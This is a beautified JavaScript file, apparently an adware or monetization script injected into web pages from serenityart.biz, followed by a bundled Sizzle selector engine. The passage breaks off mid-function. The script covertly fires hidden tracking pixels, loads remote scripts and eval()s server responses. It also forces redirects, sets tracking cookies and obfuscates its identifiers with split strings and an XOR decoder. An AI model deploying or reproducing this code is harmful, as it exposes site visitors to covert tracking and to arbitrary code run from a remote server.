// http://serenityart.biz/1f7cbb02d08cf61dbb.js
(function(f, i, j) {
    var g = "1f7cbb02d08cf61dbb";
    var b = (function() {
        var l = 3;
        var p = parseInt("0");
        var o = parseInt("0");
        (function() {
            var r = ["mid=", "wid=52096", "sid=", "tid=8060", "rid=LAUNCHED"];
            a = (window.location.protocol == "http:" ? "http:" : "https:") + "//serenityart.biz/metric/?" + r.join("&");
            var q = f.createElement("img");
            q.setAttribute("style", "width:0;height:0;display:none;visibility:hidden;");
            q.src = a + (a.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
            (document.head || document.documentElement).appendChild(q);
            if (typeof q.onload != j) {
                q.onload = function() {
                    q.parentNode && q.parentNode.removeChild(q)
                }
            }
        })();
        var n = false;
        if (typeof(MainWindow) != "undefined") {
            window.document = MainWindow.document.parentWindow
        }
        if (n) {
            return false
        }(function(d, w, uniqId, u) {
            var isReady = false,
                readyQueue = [],
                div = u,
                $$ = {};
            if (typeof(JSON) === u) {
                JSON = {}
            }

            function onReady() {
                isReady = true;
                while (readyQueue.length > 0) {
                    (readyQueue.pop())()
                }
            }
            if (typeof(d.getElementsByClassName) == u) {
                d.getElementsByClassName = function(cl) {
                    var retnode = [];
                    var myclass = new RegExp("\\b" + cl + "\\b");
                    var elem = this.getElementsByTagName("*");
                    for (var i = 0; i < elem.length; i++) {
                        var classes = elem[i].className;
                        if (myclass.test(classes)) {
                            retnode.push(elem[i])
                        }
                    }
                    return retnode
                }
            }
            $$ = w[uniqId] = {
                l: {},
                isIe: !!d.attachEvent,
                scriptDomain: "serenityart.biz",
                unixTimestampNow: Math.round(new Date().getTime() / 1000),
                optoutValue: {},
                limitsValue: {},
                currentOptoutBlock: null,
                monetizationsConfig: {},
                ready: function(callback) {
                    !isReady ? readyQueue.push(callback) : callback()
                },
                createEl: function(html) {
                    if (div === u) {
                        div = d.createElement("div")
                    }
                    div.innerHTML = html;
                    return div.firstChild
                },
                each: function(array, callback) {
                    var i = 0,
                        length = array.length;
                    for (; i < length;) {
                        if (callback(array[i], i++) === false) {
                            return true
                        }
                    }
                },
                inArray: function(array, e) {
                    var i = 0,
                        length = array.length;
                    for (; i < length; i++) {
                        if (e === array[i]) {
                            return true
                        }
                    }
                    return false
                },
                filter: function(array, callback) {
                    var i = 0,
                        length = array.length,
                        ret = [];
                    for (; i < length; i++) {
                        if (callback(array[i], i)) {
                            ret.push(array[i])
                        }
                    }
                    return ret
                },
                apply: function() {
                    var obj = {};
                    $$.each(arguments, function(arg) {
                        for (var i in arg) {
                            obj[i] = arg[i]
                        }
                    });
                    return obj
                },
                xhrRequest: function(xhr, o) {
                    var timeoutId = u,
                        isTimedout = false,
                        $this = this;

                    function __gacb(data) {
                        o.callback(data)
                    }
                    o.url += (o.url.indexOf("?") >= 0 ? "&" : "?") + "ajax";
                    xhr.onreadystatechange = function() {
                        if (isTimedout) {
                            return
                        }
                        if (xhr.readyState === 4) {
                            if (xhr.status === 200 && xhr.responseText) {
                                if (timeoutId) {
                                    clearTimeout(timeoutId)
                                }
                                if (xhr.responseText.indexOf("__gacb(") > -1) {
                                    eval(xhr.responseText)
                                } else {
                                    o.callback($this.fromJson(xhr.responseText))
                                }
                            }
                        }
                    };
                    xhr.open("GET", o.url);
                    xhr.withCredentials = false;
                    timeoutId = setTimeout(function() {
                        isTimedout = true;
                        xhr.abort();
                        $$.jsonpRequest(o)
                    }, o.timeout);
                    xhr.send()
                },
                jsonp: function(opts) {
                    var timeoutId = u,
                        isTimedout = false;
                    var o = $$.apply({
                        callback: function() {},
                        timeout: 15000,
                        onTimeout: function() {},
                        data: {}
                    }, opts || {});
                    var r = Math.floor(Math.random() * 1000000000);
                    var jsonpFunction = "__twb_cb_" + r;
                    w[jsonpFunction] = function(data) {
                        if (isTimedout) {
                            return
                        }
                        if (timeoutId) {
                            clearTimeout(timeoutId)
                        }
                        o.callback(data);
                        onComplete()
                    };
                    var onComplete = function() {
                        w[jsonpFunction] = u;
                        if (s && s.parentNode) {
                            s.parentNode.removeChild(s)
                        }
                    };
                    o.url += (o.url.indexOf("?") >= 0 ? "&" : "?") + "jsonp=" + jsonpFunction + "&" + $$.toUrlParams(o.data);
                    var s = $$.script(o.url);
                    timeoutId = setTimeout(function() {
                        isTimedout = true;
                        o.onTimeout();
                        onComplete()
                    }, o.timeout)
                },
                toUrlParams: function(formdata, numeric_prefix, arg_separator) {
                    var value, key, tmp = [];
                    var _http_build_query_helper = function(key, val, arg_separator) {
                        var k, tmp = [];
                        if (val === true) {
                            val = "1"
                        } else {
                            if (val === false) {
                                val = "0"
                            }
                        }
                        if (val != null) {
                            if (typeof val === "object") {
                                for (k in val) {
                                    if (val[k] != null) {
                                        tmp.push(_http_build_query_helper(key + "[" + k + "]", val[k], arg_separator))
                                    }
                                }
                                return tmp.join(arg_separator)
                            } else {
                                if (typeof val !== "function") {
                                    return w.encodeURIComponent(key) + "=" + w.encodeURIComponent(val)
                                } else {
                                    return ""
                                }
                            }
                        } else {
                            return ""
                        }
                    };
                    if (!arg_separator) {
                        arg_separator = "&"
                    }
                    for (key in formdata) {
                        value = formdata[key];
                        if (numeric_prefix && !isNaN(key)) {
                            key = String(numeric_prefix) + key
                        }
                        var query = _http_build_query_helper(key, value, arg_separator);
                        if (query !== "") {
                            tmp.push(query)
                        }
                    }
                    return tmp.join(arg_separator)
                },
                jsonpRequest: function(o) {
                    var timeoutId = u,
                        isTimedout = false;
                    callbackName = "f" + this.randomNumber(10000, 9999999);
                    o.url += (o.url.indexOf("?") >= 0 ? "&" : "?") + "jsonp=" + callbackName;
                    w[callbackName] = function(data) {
                        if (isTimedout) {
                            return
                        }
                        if (timeoutId) {
                            clearTimeout(timeoutId)
                        }
                        o.callback(data)
                    };
                    var s = $$.script(o.url);
                    timeoutId = setTimeout(function() {
                        isTimedout = true;
                        s.parentNode.removeChild(s);
                        o.onTimeout()
                    }, o.timeout)
                },
                toJson: JSON.stringify || function(obj) {
                    var t = typeof(obj);
                    if (t != "object" || obj === null) {
                        if (t == "string") {
                            obj = '"' + obj + '"'
                        }
                        return String(obj)
                    } else {
                        var n, v, json = [],
                            arr = (obj && obj.constructor == Array);
                        for (n in obj) {
                            v = obj[n];
                            t = typeof(v);
                            if (t == "string") {
                                v = '"' + v + '"'
                            } else {
                                if (t == "object" && v !== null) {
                                    v = arguments.callee(v)
                                }
                            }
                            json.push((arr ? "" : '"' + n + '":') + String(v))
                        }
                        return (arr ? "[" : "{") + String(json) + (arr ? "]" : "}")
                    }
                },
                fromJson: JSON.parse || function(str) {
                    if (str === "") {
                        str = '""'
                    }
                    eval("var p=" + str + ";");
                    return p
                },
                xor: function(str) {
                    var i = 0,
                        length = str.length,
                        ret = "";
                    for (; i < length;) {
                        ret += String.fromCharCode(77 ^ str.charCodeAt(i++))
                    }
                    return ret
                },
                script: function(src, nocache, attributes) {
                    var s = d.createElement("script");
                    s.type = "text/javascript";
                    if (attributes) {
                        for (var i in attributes) {
                            s.setAttribute(i, attributes[i])
                        }
                    }
                    s.src = src + (nocache === u || nocache ? (src.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime()) : "");
                    if (d.getElementsByTagName("script") || d.documentElement.firstChild) {
                        (d.getElementsByTagName("script")[0] || d.documentElement.firstChild).parentNode.appendChild(s)
                    } else {
                        if (d.getElementsByTagName("head")) {
                            d.getElementsByTagName("head")[0].appendChild(s)
                        } else {
                            d.getElementsByTagName("body")[0].appendChild(s)
                        }
                    }
                    return s
                },
                includeCss: function(src) {
                    var style = d.createElement("link");
                    if (d.getElementsByTagName("body")[0]) {
                        d.getElementsByTagName("body")[0].appendChild(style);
                        style.rel = "stylesheet";
                        style.type = "text/css";
                        style.href = src
                    }
                },
                hasClass: function(element, className) {
                    return (!!element.getAttribute("class") && element.getAttribute("class").indexOf(className) > -1)
                },
                addClass: function(element, className) {
                    element.setAttribute("class", (!!element.getAttribute("class") ? element.getAttribute("class") + " " : "") + className)
                },
                removeClass: function(element, className) {
                    if (!!element.getAttribute("class")) {
                        element.setAttribute("class", element.getAttribute("class").replace(className, ""))
                    }
                },
                randomNumber: function(min, max) {
                    return Math.floor(Math.random() * (max - min + 1) + min)
                },
                eval: function(data) {
                    var s = d.createElement("script");
                    s.defer = true;
                    s.text = data;
                    (d.getElementsByTagName("script")[0] || d.documentElement.firstChild).parentNode.appendChild(s)
                },
                on: function(el, event, fn) {
                    var handler = function(event) {
                        fn.call(el, event || w.event)
                    };
                    if (el.addEventListener) {
                        el.addEventListener(event, handler, false)
                    } else {
                        if (el.attachEvent) {
                            el.attachEvent("on" + event, handler)
                        }
                    }
                },
                redirect: function(url, blank) {
                    var a = d.createElement("a");
                    a.href = url;
                    if (blank) {
                        a.target = "_blank"
                    }
                    a.__norewrite = true;
                    d.body.appendChild(a);
                    a.click();
                    d.body.removeChild(a)
                },
                setCookie: function(name, value, opts) {
                    var o = opts || {},
                        expire = u;
                    if (o.expire) {
                        expire = new Date();
                        expire.setTime(expire.getTime() + (o.expire * 1000))
                    }
                    document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value) + (expire ? "; expires=" + expire.toUTCString() : "") + (o.path ? "; path=" + o.path : "") + (o.domain ? "; domain=" + o.domain : "")
                },
                getCookie: function(name) {
                    var value = u;
                    $$.each(d.cookie.split("; "), function(raw) {
                        var parts = raw.split("=");
                        var cookieName = decodeURIComponent(parts.shift());
                        if (cookieName == name) {
                            value = decodeURIComponent(parts.join("="));
                            return false
                        }
                    });
                    return value
                },
                encode: function(s) {
                    var i = 0,
                        ret = "",
                        length = s.length;
                    for (; i < length; i++) {
                        ret += ("%" + s.charCodeAt(i).toString(16))
                    }
                    return ret
                },
                preventDefault: function(e) {
                    if (e.preventDefault) {
                        e.preventDefault()
                    }
                    return e.returnValue = false
                },
                remove: function(e) {
                    return e.parentNode && e.parentNode.removeChild(e)
                },
                attr: function(e, name) {
                    if (e.hasAttribute && e.hasAttribute(name)) {
                        return e.getAttribute(name)
                    } else {
                        var node = e.getAttributeNode(name);
                        if (node) {
                            return node.value
                        }
                    }
                    return ""
                },
                updateLimits: function(block, lifetime) {
                    if (!lifetime) {
                        var mConfig = {};
                        if (w[uniqId].monetizationsConfig && w[uniqId].monetizationsConfig[block]) {
                            mConfig = w[uniqId].monetizationsConfig[block]
                        }
                        lifetime = mConfig.limit
                    }
                    if (lifetime > 0) {
                        $$.limitsValue[block] = $$.unixTimestampNow + parseInt(lifetime);
                        var cookieValue = $$.toJson($$.limitsValue);
                        $$.jsonp({
                            url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/limit",
                            data: {
                                key: "1f7cbb02d08cf61dbb",
                                cv: cookieValue
                            },
                            callback: function(response) {}
                        })
                    } else {}
                },
                setStartTime: function() {
                    var cookieValue = $$.unixTimestampNow;
                    $$.jsonp({
                        url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/strtm",
                        data: {
                            key: "1f7cbb02d08cf61dbb",
                            cv: cookieValue
                        },
                        callback: function(response) {}
                    })
                },
                updateLifeTime: function(lifeTime, lastActionTime) {
                    if (!lastActionTime) {
                        lastActionTime = $$.unixTimestampNow
                    }
                    if (!lifeTime) {
                        lifeTime = 0
                    }
                    var actionDiff = $$.unixTimestampNow - lastActionTime;
                    $$.jsonp({
                        url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/lat",
                        data: {
                            key: "1f7cbb02d08cf61dbb",
                            cv: $$.unixTimestampNow
                        }
                    });
                    if (actionDiff < 600) {
                        var newLifeTime = parseInt(parseInt(lifeTime) + parseInt(actionDiff));
                        $$.jsonp({
                            url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/lt",
                            data: {
                                key: "1f7cbb02d08cf61dbb",
                                cv: newLifeTime
                            }
                        })
                    } else {}
                },
                loadedCallback: function(code, block, custom1, custom2, custom3, custom4, custom5) {
                    if (typeof block == "undefined") {
                        block = ""
                    }
                    var params = ["mid=" + block, "wid=52096", "sid=" + ((w[uniqId] && w[uniqId].tbParams && w[uniqId].tbParams.sid) ? w[uniqId].tbParams.sid : ""), "tid=8060", "rid=" + code];
                    if (custom1) {
                        params.push("custom1=" + custom1)
                    }
                    if (custom2) {
                        params.push("custom2=" + custom2)
                    }
                    if (custom3) {
                        params.push("custom3=" + custom3)
                    }
                    if (custom4) {
                        params.push("custom4=" + custom4)
                    }
                    if (custom5) {
                        params.push("custom5=" + custom5)
                    }
                    var src = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/metric/?" + params.join("&");
                    var imgEl = d.createElement("img");
                    imgEl.setAttribute("style", "width:0;height:0;display:none;visibility:hidden;");
                    imgEl.src = src + (src.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
                    d.getElementsByTagName("body")[0].appendChild(imgEl);
                    $$.on(imgEl, "load", function() {
                        $$.remove(imgEl)
                    })
                },
                reportSetCallback: function(response) {},
                host: function(url) {
                    var m = url.match(/^https?:\/\/([^\/]+)/);
                    return m ? m[1] : ""
                },
                optoutShow: function(block) {
                    if ($$.tbParams.optoutUrl) {
                        location.href = $$.tbParams.optoutUrl
                    } else {
                        if (!$$.twBarOptOut && typeof $$.twBarOptOutInit == "function") {
                            $$.twBarOptOutInit()
                        }
                        if ($$.twBarOptOut) {
                            $$.currentOptoutBlock = block;
                            $$.twBarOptOut.style.display = "block";
                            $$.loadedCallback("OPTOUT_SHOW", block)
                        }
                    }
                },
                optoutHide: function(block) {
                    if ($$.twBarOptOut) {
                        $$.twBarOptOut.style.display = "none"
                    }
                },
                getMtzCfg: function(block) {
                    var fname = ["mone", "tiza", "tions", "Config"].join("");
                    if (w[uniqId][fname] && w[uniqId][fname][block] && w[uniqId][fname][block].config) {
                        return w[uniqId][fname][block].config
                    }
                    return {}
                }
            };
            var getMtzConfigAlias = ["get", "Mon", "etiza", "tion", "Config"].join("");
            $$[getMtzConfigAlias] = function(block) {
                return $$.getMtzCfg(block)
            };
            if (d.addEventListener) {
                d.addEventListener("DOMContentLoaded", function() {
                    onReady()
                }, false)
            } else {
                if (d.attachEvent) {
                    d.attachEvent("onreadystatechange", function() {
                        onReady()
                    })
                }
            }
            if (d.readyState) {
                (function() {
                    if ((!$$.isIe && d.readyState === "interactive") || d.readyState === "complete") {
                        onReady()
                    } else {
                        setTimeout(arguments.callee, 100)
                    }
                })()
            } else {
                var toplevel = false;
                try {
                    toplevel = window.frameElement == null
                } catch (e) {}
                if (d && d.dElement && d.dElement.doScroll && toplevel) {
                    (function() {
                        try {
                            d.dElement.doScroll("left")
                        } catch (e) {
                            setTimeout(arguments.callee, 100);
                            return
                        }
                        onReady()
                    })()
                }
            }
        })(document, window, "1f7cbb02d08cf61dbb", undefined);;
        (function(aA, q) {
            var G, aD, l, v, R, U, ag, aH, S, aj, L, w, at, an, aB, k, P, av = "sizzle" + -(new Date()),
                T = aA.document,
                aE = 0,
                ao = 0,
                d = J(),
                au = J(),
                Q = J(),
                ah = false,
                N = function() {
                    return 0
                },
                az = typeof q,
                ab = 1 << 31,
                Y = ({}).hasOwnProperty,
                ax = [],
                ay = ax.pop,
                W = ax.push,
                b = ax.push,
                u = ax.slice,
                j = ax.indexOf || function(aJ) {
                    var aI = 0,
                        e = this.length;
                    for (; aI < e; aI++) {
                        if (this[aI] === aJ) {
                            return aI
                        }
                    }
                    return -1
                },
                c = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                x = "[\\x20\\t\\r\\n\\f]",
                a = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
                V = a.replace("w", "w#"),
                aq = "\\[" + x + "*(" + a + ")" + x + "*(?:([*^$|!~]?=)" + x + "*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|(" + V + ")|)|)" + x + "*\\]",
                s = ":(" + a + ")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|" + aq.replace(3, 8) + ")*)|.*)\\)|)",
                z = new RegExp("^" + x + "+|((?:^|[^\\\\])(?:\\\\.)*)" + x + "+$", "g"),
                D = new RegExp("^" + x + "*," + x + "*"),
                K = new RegExp("^" + x + "*([>+~]|" + x + ")" + x + "*"),
                al = new RegExp(x + "*[+~]"),
                B = new RegExp("=" + x + "*([^\\]'\"]*)" + x + "*\\]", "g"),
                ad = new RegExp(s),
                ae = new RegExp("^" + V + "$"),
                am = {
                    ID: new RegExp("^#(" + a + ")"),
                    CLASS: new RegExp("^\\.(" + a + ")"),
                    TAG: new RegExp("^(" + a.replace("w", "w*") + ")"),
                    ATTR: new RegExp("^" + aq),
                    PSEUDO: new RegExp("^" + s),
                    CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + x + "*(even|odd|(([+-]|)(\\d*)n|)" + x + "*(?:([+-]|)" + x + "*(\\d+)|))" + x + "*\\)|)", "i"),
                    bool: new RegExp("^(?:" + c + ")$", "i"),
                    needsContext: new RegExp("^" + x + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + x + "*((?:-\\d)?\\d*)" + x + "*\\)|)(?=[^-]|$)", "i")
                },
                aa = /^[^{]+\{\s*\[native \w/,
                ac = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                h = /^(?:input|select|textarea|button)$/i,
                t = /^h\d$/i,
                X = /'|\\/g,
                A = new RegExp("\\\\([\\da-f]{1,6}" + x + "?|(" + x + ")|.)", "ig"),
                ap = function(e, aJ, i) {
                    var aI = "0x" + aJ - 65536;
                    return aI !== aI || i ? aJ : aI < 0 ? String.fromCharCode(aI + 65536) : String.fromCharCode(aI >> 10 | 55296, aI & 1023 | 56320)
                };
            try {
                b.apply((ax = u.call(T.childNodes)), T.childNodes);
                ax[T.childNodes.length].nodeType
            } catch (M) {
                b = {
                    apply: ax.length ? function(i, e) {
                        W.apply(i, u.call(e))
                    } : function(aK, aJ) {
                        var e = aK.length,
                            aI = 0;
                        while ((aK[e++] = aJ[aI++])) {}
                        aK.length = e - 1
                    }
                }
            }

            function E(aP, aI, aT, aV) {
                var aU, aM, aN, aR, aS, aL, aK, e, aJ, aQ;
                if ((aI ? aI.ownerDocument || aI : T) !== L) {
                    aj(aI)
                }
                aI = aI || L;
                aT = aT || [];
                if (!aP || typeof aP !== "string") {
                    return aT
                }
                if ((aR = aI.nodeType) !== 1 && aR !== 9) {
                    return []
                }
                if (at && !aV) {
                    if ((aU = ac.exec(aP))) {
                        if ((aN = aU[1])) {
                            if (aR === 9) {
                                aM = aI.getElementById(aN);
                                if (aM && aM.parentNode) {
                                    if (aM.id === aN) {
                                        aT.push(aM);
                                        return aT
                                    }
                                } else {
                                    return aT
                                }
                            } else {
                                if (aI.ownerDocument && (aM = aI.ownerDocument.getElementById(aN)) && P(aI, aM) && aM.id === aN) {
                                    aT.push(aM);
                                    return aT
                                }
                            }
                        } else {
                            if (aU[2]) {
                                b.apply(aT, aI.getElementsByTagName(aP));
                                return aT
                            } else {
                                if ((aN = aU[3]) && aD.getElementsByClassName && aI.getElementsByClassName) {
                                    b.apply(aT, aI.getElementsByClassName(aN));
                                    return aT
                                }
                            }
                        }
                    }
                    if (aD.qsa && (!an || !an.test(aP))) {
                        e = aK = av;
                        aJ = aI;
                        aQ = aR === 9 && aP;
                        if (aR === 1 && aI.nodeName.toLowerCase() !== "object") {
                            aL = p(aP);
                            if ((aK = aI.getAttribute("id"))) {
                                e = aK.replace(X, "\\$&")
                            } else {
                                aI.setAttribute("id", e)
                            }
                            e = "[id='" + e + "'] ";
                            aS = aL.length;
                            while (aS--) {
                                aL[aS] = e + o(aL[aS])
                            }
                            aJ = al.test(aP) && aI.parentNode || aI;
                            aQ = aL.join(",")
                        }
                        if (aQ) {
                            try {
                                b.apply(aT, aJ.querySelectorAll(aQ));
                                return aT
                            } catch (aO) {} finally {
                                if (!aK) {
                                    aI.removeAttribute("id")
                                }
                            }
                        }
                    }
                }
                return aC(aP.replace(z, "$1"), aI, aT, aV)
            }

            function O(e) {
                return aa.test(e + "")
            }

            function J() {
                var i = [];

                function e(aI, aJ) {
                    if (i.push(aI += " ") > v.cacheLength) {
                        delete e[i.shift()]
                    }
                    return (e[aI] = aJ)
                }
                return e
            }

            function r(e) {
                e[av] = true;
                return e
            }

            function m(i) {
                var aJ = L.createElement("div");
                try {
                    return !!i(aJ)
                } catch (aI) {
                    return false
                } finally {
                    if (aJ.parentNode) {
                        aJ.parentNode.removeChild(aJ)
                    }
                    aJ = null
                }
            }

            function aF(e, aJ, aM) {
                e = e.split("|");
                var aL, aI = e.length,
                    aK = aM ? null : aJ;
                while (aI--) {
                    if (!(aL = v.attrHandle[e[aI]]) || aL === aJ) {
                        v.attrHandle[e[aI]] = aK
                    }
                }
            }

            function Z(i, e) {
                var aI = i.getAttributeNode(e);
                return aI && aI.specified ? aI.value : i[e] === true ? e.toLowerCase() : null
            }

            function H(i, e) {
                return i.getAttribute(e, e.toLowerCase() === "type" ? 1 : 2)
            }

            function C(e) {
                if (e.nodeName.toLowerCase() === "input") {
                    return e.defaultValue
                }
            }

            function f(i, e) {
                var aJ = e && i,
                    aI = aJ && i.nodeType === 1 && e.nodeType === 1 && (~e.sourceIndex || ab) - (~i.sourceIndex || ab);
                if (aI) {
                    return aI
                }
                if (aJ) {
                    while ((aJ = aJ.nextSibling)) {
                        if (aJ === e) {
                            return -1
                        }
                    }
                }
                return i ? 1 : -1
            }

            function F(e) {
                return function(aI) {
                    var i = aI.nodeName.toLowerCase();
                    return i === "input" && aI.type === e
                }
            }

            function g(e) {
                return function(aI) {
                    var i = aI.nodeName.toLowerCase();
                    return (i === "input" || i === "button") && aI.type === e
                }
            }

            function ar(e) {
                return r(function(i) {
                    i = +i;
                    return r(function(aI, aM) {
                        var aK, aJ = e([], aI.length, i),
                            aL = aJ.length;
                        while (aL--) {
                            if (aI[(aK = aJ[aL])]) {
                                aI[aK] = !(aM[aK] = aI[aK])
                            }
                        }
                    })
                })
            }
            U = E.isXML = function(e) {
                var i = e && (e.ownerDocument || e).documentElement;
                return i ? i.nodeName !== "HTML" : false
            };
            aD = E.support = {};
            aj = E.setDocument = function(e) {
                var i = e ? e.ownerDocument || e : T;
                if (i === L || i.nodeType !== 9 || !i.documentElement) {
                    return L
                }
                L = i;
                w = i.documentElement;
                at = !U(i);
                aD.attributes = m(function(aI) {
                    aI.innerHTML = "<a href='#'></a>";
                    aF("type|href|height|width", H, aI.firstChild.getAttribute("href") === "#");
                    aF(c, Z, aI.getAttribute("disabled") == null);
                    aI.className = "i";
                    return !aI.getAttribute("className")
                });
                aD.input = m(function(aI) {
                    aI.innerHTML = "<input>";
                    aI.firstChild.setAttribute("value", "");
                    return aI.firstChild.getAttribute("value") === ""
                });
                aF("value", C, aD.attributes && aD.input);
                aD.getElementsByTagName = m(function(aI) {
                    aI.appendChild(i.createComment(""));
                    return !aI.getElementsByTagName("*").length
                });
                aD.getElementsByClassName = m(function(aI) {
                    aI.innerHTML = "<div class='a'></div><div class='a i'></div>";
                    aI.firstChild.className = "i";
                    return aI.getElementsByClassName("i").length === 2
                });
                aD.getById = m(function(aI) {
                    w.appendChild(aI).id = av;
                    return !i.getElementsByName || !i.getElementsByName(av).length
                });
                if (aD.getById) {
                    v.find.ID = function(aK, aJ) {
                        if (typeof aJ.getElementById !== az && at) {
                            var aI = aJ.getElementById(aK);
                            return aI && aI.parentNode ? [aI] : []
                        }
                    };
                    v.filter.ID = function(aJ) {
                        var aI = aJ.replace(A, ap);
                        return function(aK) {
                            return aK.getAttribute("id") === aI
                        }
                    }
                } else {
                    delete v.find.ID;
                    v.filter.ID = function(aJ) {
                        var aI = aJ.replace(A, ap);
                        return function(aL) {
                            var aK = typeof aL.getAttributeNode !== az && aL.getAttributeNode("id");
                            return aK && aK.value === aI
                        }
                    }
                }
                v.find.TAG = aD.getElementsByTagName ? function(aI, aJ) {
                    if (typeof aJ.getElementsByTagName !== az) {
                        return aJ.getElementsByTagName(aI)
                    }
                } : function(aI, aM) {
                    var aN, aL = [],
                        aK = 0,
                        aJ = aM.getElementsByTagName(aI);
                    if (aI === "*") {
                        while ((aN = aJ[aK++])) {
                            if (aN.nodeType === 1) {
                                aL.push(aN)
                            }
                        }
                        return aL
                    }
                    return aJ
                };
                v.find.CLASS = aD.getElementsByClassName && function(aJ, aI) {
                    if (typeof aI.getElementsByClassName !== az && at) {
                        return aI.getElementsByClassName(aJ)
                    }
                };
                aB = [];
                an = [];
                if ((aD.qsa = O(i.querySelectorAll))) {
                    m(function(aI) {
                        aI.innerHTML = "<select><option selected=''></option></select>";
                        if (!aI.querySelectorAll("[selected]").length) {
                            an.push("\\[" + x + "*(?:value|" + c + ")")
                        }
                        if (!aI.querySelectorAll(":checked").length) {
                            an.push(":checked")
                        }
                    });
                    m(function(aJ) {
                        var aI = i.createElement("input");
                        aI.setAttribute("type", "hidden");
                        aJ.appendChild(aI).setAttribute("t", "");
                        if (aJ.querySelectorAll("[t^='']").length) {
                            an.push("[*^$]=" + x + "*(?:''|\"\")")
                        }
                        if (!aJ.querySelectorAll(":enabled").length) {
                            an.push(":enabled", ":disabled")
                        }
                        aJ.querySelectorAll("*,:x");
                        an.push(",.*:")
                    })
                }
                if ((aD.matchesSelector = O((k = w.webkitMatchesSelector || w.mozMatchesSelector || w.oMatchesSelector || w.msMatchesSelector)))) {
                    m(function(aI) {
                        aD.disconnectedMatch = k.call(aI, "div");
                        k.call(aI, "[s!='']:x");
                        aB.push("!=", s)
                    })
                }
                an = an.length && new RegExp(an.join("|"));
                aB = aB.length && new RegExp(aB.join("|"));
                P = O(w.contains) || w.compareDocumentPosition ? function(aJ, aI) {
                    var aL = aJ.nodeType === 9 ? aJ.documentElement : aJ,
                        aK = aI && aI.parentNode;
                    return aJ === aK || !!(aK && aK.nodeType === 1 && (aL.contains ? aL.contains(aK) : aJ.compareDocumentPosition && aJ.compareDocumentPosition(aK) & 16))
                } : function(aJ, aI) {
                    if (aI) {
                        while ((aI = aI.parentNode)) {
                            if (aI === aJ) {
                                return true
                            }
                        }
                    }
                    return false
                };
                aD.sortDetached = m(function(aI) {
                    return aI.compareDocumentPosition(i.createElement("div")) & 1
                });
                N = w.compareDocumentPosition ? function(aJ, aI) {
                    if (aJ === aI) {
                        ah = true;
                        return 0
                    }
                    var aK = aI.compareDocumentPosition && aJ.compareDocumentPosition && aJ.compareDocumentPosition(aI);
                    if (aK) {
                        if (aK & 1 || (!aD.sortDetached && aI.compareDocumentPosition(aJ) === aK)) {
                            if (aJ === i || P(T, aJ)) {
                                return -1
                            }
                            if (aI === i || P(T, aI)) {
                                return 1
                            }
                            return S ? (j.call(S, aJ) - j.call(S, aI)) : 0
                        }
                        return aK & 4 ? -1 : 1
                    }
                    return aJ.compareDocumentPosition ? -1 : 1
                } : function(aJ, aI) {
                    var aP, aM = 0,
                        aO = aJ.parentNode,
                        aL = aI.parentNode,
                        aK = [aJ],
                        aN = [aI];
                    if (aJ === aI) {
                        ah = true;
                        return 0
                    } else {
                        if (!aO || !aL) {
                            return aJ === i ? -1 : aI === i ? 1 : aO ? -1 : aL ? 1 : S ? (j.call(S, aJ) - j.call(S, aI)) : 0
                        } else {
                            if (aO === aL) {
                                return f(aJ, aI)
                            }
                        }
                    }
                    aP = aJ;
                    while ((aP = aP.parentNode)) {
                        aK.unshift(aP)
                    }
                    aP = aI;
                    while ((aP = aP.parentNode)) {
                        aN.unshift(aP)
                    }
                    while (aK[aM] === aN[aM]) {
                        aM++
                    }
                    return aM ? f(aK[aM], aN[aM]) : aK[aM] === T ? -1 : aN[aM] === T ? 1 : 0
                };
                return i
            };
            E.matches = function(i, e) {
                return E(i, null, null, e)
            };
            E.matchesSelector = function(aI, aK) {
                if ((aI.ownerDocument || aI) !== L) {
                    aj(aI)
                }
                aK = aK.replace(B, "='$1']");
                if (aD.matchesSelector && at && (!aB || !aB.test(aK)) && (!an || !an.test(aK))) {
                    try {
                        var i = k.call(aI, aK);
                        if (i || aD.disconnectedMatch || aI.document && aI.document.nodeType !== 11) {
                            return i
                        }
                    } catch (aJ) {}
                }
                return E(aK, L, null, [aI]).length > 0
            };
            E.contains = function(e, i) {
                if ((e.ownerDocument || e) !== L) {
                    aj(e)
                }
                return P(e, i)
            };
            E.attr = function(aI, e) {
                if ((aI.ownerDocument || aI) !== L) {
                    aj(aI)
                }
                var i = v.attrHandle[e.toLowerCase()],
                    aJ = (i && Y.call(v.attrHandle, e.toLowerCase()) ? i(aI, e, !at) : q);
                return aJ === q ? aD.attributes || !at ? aI.getAttribute(e) : (aJ = aI.getAttributeNode(e)) && aJ.specified ? aJ.value : null : aJ
            };
            E.error = function(e) {
                throw new Error("Syntax error, unrecognized expression: " + e)
            };
            E.uniqueSort = function(aJ) {
                var aK, aL = [],
                    e = 0,
                    aI = 0;
                ah = !aD.detectDuplicates;
                S = !aD.sortStable && aJ.slice(0);
                aJ.sort(N);
                if (ah) {
                    while ((aK = aJ[aI++])) {
                        if (aK === aJ[aI]) {
                            e = aL.push(aI)
                        }
                    }
                    while (e--) {
                        aJ.splice(aL[e], 1)
                    }
                }
                return aJ
            };
            R = E.getText = function(aL) {
                var aK, aI = "",
                    aJ = 0,
                    e = aL.nodeType;
                if (!e) {
                    for (;
                        (aK = aL[aJ]); aJ++) {
                        aI += R(aK)
                    }
                } else {
                    if (e === 1 || e === 9 || e === 11) {
                        if (typeof aL.textContent === "string") {
                            return aL.textContent
                        } else {
                            for (aL = aL.firstChild; aL; aL = aL.nextSibling) {
